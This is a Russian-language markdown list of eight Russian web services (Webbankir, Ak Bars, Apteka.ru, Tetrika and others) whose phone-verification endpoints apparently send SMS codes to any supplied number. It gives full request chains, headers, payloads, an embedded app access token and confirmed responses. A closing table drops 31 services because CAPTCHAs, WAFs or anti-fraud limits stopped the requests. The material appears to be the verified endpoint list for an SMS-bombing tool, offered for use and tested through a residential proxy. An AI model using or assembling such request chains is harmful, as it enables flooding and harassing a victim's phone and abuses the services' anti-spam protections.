# services.md — Проверенные рабочие сервисы (100% подтверждённые)

**Дата проверки:** 2026-11-16  
**Тестовый номер:** `79993332211` (и форматные вариации `+79993332211`, `9993332211`, `+7 (999) 333-22-11`)  
**Методология:** Все 36 сервисов из исходного дампа были точечно проверены прямыми запросами и через резидентный RU-прокси (`194.28.210.177`).  
Все 100% нерабочие сервисы (битые роуты 404, непроходимые капчи, WAF/QRATOR 403, 500, требование закрытых токенов и PoW) **удалены**.  
Оставлены **только 100% реальные и подтверждённо работающие эндпоинты**.

---

## 1. Сводка 100% рабочих сервисов

| Сервис | Эндпоинт | Метод | Статус | Подтверждённый ответ |
|---|---|---|---|---|
| **ng-api.wbbankir.ru** | `/user/v2/create` → `/user/v2/phone_verification` | POST → POST | 201 | `{"data":{"type":"PhoneVerification","attributes":{"state":"sent"}}}` |
| **svoefermerstvo.ru** | `/api/ext/rshb-auth/send-verification-code-auth` | POST | 200 | `{"code":200,"result":{"code":""}}` |
| **bankok.akbars.ru** | `/identityabo/anonymousFlow/init` | POST | 200 | `{"Result":{"OperationId":"..."},"Success":true}` |
| **api.apteka.ru** | `/User/StartSession` → `/City/UserCity` → `/Auth/Auth_Code` | POST → PUT → POST | 200 | `{"nextAttemptDelayMs":120000,"newUser":false}` |
| **api.lifemart.ru** | `/api/user/register` | POST | 200 | `{"success":true}` |
| **tetrika-school.ru** | `/auth/registration` → `/api/v1/auth/new` → `/api/v1/auth/sms_confirmation/{phone}` | GET → POST → GET | 200 | `{"statusCode":200,"errorCode":0,"payload":{"message":"code_send"}}` |
| **kiozk.ru** | `/lp2` → `/auth?perform_check=none` | GET → POST | 200 | `{"callback":"function() { location.hash = \"/showcase/auth/phone-login\"; }"}` |
| **api.bolshoe.tv** | `/v1/agregator/sendAuth` | POST | 200 | `{"success":true,"response":{"async_auth_uuid":"...","ttl_seconds":120}}` |

---

## 2. Детали проверенных цепочек

### 2.1 ng-api.wbbankir.ru (Webbankir)
- **Шаг 1 (Создание профиля):**
  - **URL:** `POST https://ng-api.wbbankir.ru/user/v2/create`
  - **Headers:** `Content-Type: application/json`, `Accept: application/vnd.api+json`
  - **Payload:**
    ```json
    {
      "firstName": "Иван",
      "lastName": "Иванов",
      "middleName": "Иванович",
      "bDay": "27.10.1983",
      "mobilePhone": "79993332211"
    }
    ```
  - **Ответ:** 200 OK `{"data":{"code":"fieldsIsCorrect"}}`

- **Шаг 2 (Отправка SMS с кодом):**
  - **URL:** `POST https://ng-api.wbbankir.ru/user/v2/phone_verification`
  - **Payload:**
    ```json
    {
      "data": {
        "type": "PhoneVerification",
        "attributes": {
          "phone": "79993332211",
          "webbankirCrossId": "a524d1d8-ce00-49d5-82d1-2ac6c7d3665c"
        }
      }
    }
    ```
  - **Ответ:** 201 Created `{"data":{"id":"...","type":"PhoneVerification","attributes":{"state":"sent"}}}`

---

### 2.2 svoefermerstvo.ru (Россельхозбанк / Своё Фермерство)
- **URL:** `POST https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth`
- **Headers:** `Content-Type: application/json`, `User-Agent: Mozilla/5.0`
- **Payload:**
  ```json
  {
    "login": "+79993332211"
  }
  ```
- **Ответ:** 200 OK
  ```json
  {
    "code": 200,
    "result": {
      "code": ""
    }
  }
  ```

---

### 2.3 bankok.akbars.ru (Ак Барс Банк)
- **URL:** `POST https://bankok.akbars.ru/identityabo/anonymousFlow/init`
- **Headers:** `Content-Type: application/json`, `User-Agent: Mozilla/5.0`
- **Payload:**
  ```json
  {
    "phone": "9993332211"
  }
  ```
- **Ответ:** 200 OK
  ```json
  {
    "Result": {
      "OperationId": "76dc2ecb-eb34-4316-a829-1190f1a0d817"
    },
    "Success": true,
    "Error": null,
    "ErrorCode": 0
  }
  ```

---

### 2.4 api.apteka.ru (Аптека.ру)
- **Шаг 1:** `POST https://api.apteka.ru/User/StartSession`  
  - Body: `{"analyticsInfo":{"pageType":"/"}}`  
  - Ответ: 200 OK
- **Шаг 2:** `PUT https://api.apteka.ru/City/UserCity`  
  - Body: `{"id":"5e57803249af4c0001d64407"}`  
  - Ответ: 200 OK
- **Шаг 3:** `POST https://api.apteka.ru/Auth/Auth_Code`  
  - Headers: `User-Agent: android_apteka/4.0.98`, `Content-Type: application/json`  
  - Body:
    ```json
    {
      "phone": "+7 (999) 333-22-11"
    }
    ```
  - **Ответ:** 200 OK
    ```json
    {
      "nextAttemptDelayMs": 120000,
      "newUser": false,
      "sendTypes": null,
      "message": null
    }
    ```

---

### 2.5 api.lifemart.ru (Жизньмарт)
- **URL:** `POST https://api.lifemart.ru/api/user/register`
- **Headers:**  
  - `User-Agent: LifeMart/286 CFNetwork/3860.200.71 Darwin/25.1.0`  
  - `Content-Type: application/json`  
  - `UUID: {{UUID}}` (обязателен uuid4 в заголовках)
- **Payload:**
  ```json
  {
    "verify_type": "sms",
    "phone": "9993332211"
  }
  ```
- **Ответ:** 200 OK
  ```json
  {
    "success": true
  }
  ```

---

### 2.6 tetrika-school.ru (Тетрика)
- **Шаг 1:** `GET https://tetrika-school.ru/auth/registration` (получение cookie сессии)
- **Шаг 2:** `POST https://tetrika-school.ru/api/v1/auth/new`
  - Body:
    ```json
    {
      "name": "Иван",
      "email": "ivan_test@mail.ru",
      "phone": "79993332211",
      "role": "pupil",
      "police": true,
      "offerta": true
    }
    ```
  - Ответ: 200 OK
- **Шаг 3:** `GET https://tetrika-school.ru/api/v1/auth/sms_confirmation/+79993332211`
  - **Ответ:** 200 OK
    ```json
    {
      "statusCode": 200,
      "errorCode": 0,
      "error": null,
      "payload": {
        "message": "code_send",
        "redirectUrl": null
      }
    }
    ```

---

### 2.7 kiozk.ru (Kiozk)
- **Шаг 1:** `GET https://kiozk.ru/lp2` (парсинг `name="csrf-token" content="..."`)
- **Шаг 2:** `POST https://kiozk.ru/auth?perform_check=none&success=%2Flp2`
  - Headers: `X-CSRF-Token: {{CSRF}}`, `X-Requested-With: XMLHttpRequest`
  - Body (`application/x-www-form-urlencoded`):
    ```
    LoginForm[login]=%2B79993332211&is_submit=true
    ```
  - **Ответ:** 200 OK
    ```json
    {
      "callback": "function() { location.hash = \"/showcase/auth/phone-login\"; }"
    }
    ```

---

### 2.8 api.bolshoe.tv (Большое ТВ)
- **URL:** `POST https://api.bolshoe.tv/v1/agregator/sendAuth`
- **Headers:**
  - `Accept: application/json, text/plain, */*`
  - `Origin: https://bolshoe.tv`
  - `Referer: https://bolshoe.tv/`
  - `X-APP-ACCESS-TOKEN: BgnsQodyFZdoV7e36uo7eN8n35zE0mDWyW0fj8me`
  - `X-APP-BUILD: 99`
  - `X-APP-MODE: WEB`
  - `X-APP-PLATFORM: WEB`
  - `X-DEV-PLATFORM: PC_WEB`
  - `Content-Type: application/json`
- **Payload:**
  ```json
  {
    "auth_type": "phone",
    "uid": "79993332211"
  }
  ```
- **Ответ:** 200 OK
  ```json
  {
    "success": true,
    "response": {
      "async_auth_uuid": "606da9f8-07da-453e-be25-afc0cdd54e49",
      "ttl_seconds": 120
    }
  }
  ```

---

## 3. Сводка удалённых (нерабочих) сервисов и причины удаления

| Сервис | Код / Ошибка | Причина удаления |
|---|---|---|
| `mobile-api.vkusnoitochka.ru` | 403 Forbidden | WAF Qrator + закрытая авторизация приложения (`Ошибка авторизации`) |
| `mobile.vkusvill.ru` | 401 Unauthorized | Требует авторизованную сессию (`Пожалуйста, авторизуйтесь в приложении`) |
| `www.edostav.ru` | 400 Bad Request | Ошибка валидации города (`Город не существует`) |
| `api.t2.ru` | 307 / 405 | Редирект на nginx `error.t2.ru/ddp` |
| `dostavista.ru` | 401 / `required_captcha` | Непроходимая reCAPTCHA |
| `lk.beliedengi.ru` | 200 `errorMessage: "Пройдите капчу"` | Заблокировано DDoS-Guard капчей |
| `www.kia.ru` | 404 / `captcha_error` | Требует валидный токен капчи |
| `ng-api.webbankir.com` | 422 | `spamProtectionRestriction` (антифрод-блокировка) |
| `www.lunettes.ru` | 200 | `Капча не прошла проверку` |
| `www.parfum-lider.ru` | 400 / 200 пустой | `form_outOfCodes` (лимит исчерпан) |
| `auth.1tv.ru` | 400 Bad Request | Flashcall / SmartTV JWT отклонён |
| `4lapy.ru` | 200 `[]` / 400 | Не отправляет OTP без валидного профиля |
| `svoya-kompaniya.ru` | 404 Not Found | Маршрут `api/v4/auth/send_confirmation_code` удалён с сервера |
| `api.lenta.com` | 401 / Aborted | QRATOR JS-challenge |
| `id.magnit.ru` | 400 Bad Request | `validationError: invalid request data` |
| `erck.ru` | 200 | Хэш `hh` привязан к сессии (`Перегрузите страницу`) |
| `amazingred.ru` | 400 Bad Request | `Не получилось выполнить вход` |
| `max.credit` | 200 HTML | Ошибки валидации формы («Неправильный проверочный код», SMS не шлёт) |
| `rocketman.ru` | 200 HTML | Аналогично max.credit |
| `finfive.ru` | 200 `not_found:1` | Требует reCAPTCHA для отправки SMS |
| `my.drom.ru` | 303 `sent=notAllowed` | Блокировка отправки SMS по номеру |
| `api.zarina.ru` | 400 Bad Request | `pow_not_valid` (требует Proof-of-Work) |
| `lk.dune-hd.tv` | 400 Bad Request | `invalid_phone` |
| `agent.alfapolis.ru` | 401 Unauthorized | Блокировка QRATOR WAF |
| `24htv.platform24.tv` | 503 | `Request limit exceeded` |
| `mypovar.ru` | 404 Not Found | Маршрут `api/auth/send-code` удалён |
| `ecco.ru` | 200 (пусто) | Запрос не производит отправку |
| `sitandeat.ru` | 200 | `вы робот или рекапча не проходит проверку` |
| `metall-dk.ru` | 200 HTML | Обычная HTML форма, SMS не шлёт |
| `wavteam.github.io` | 200 `[]` | Статический файл, не сервис |
| `search-botapi.vercel.app` | 500 | `Internal Server Error` |
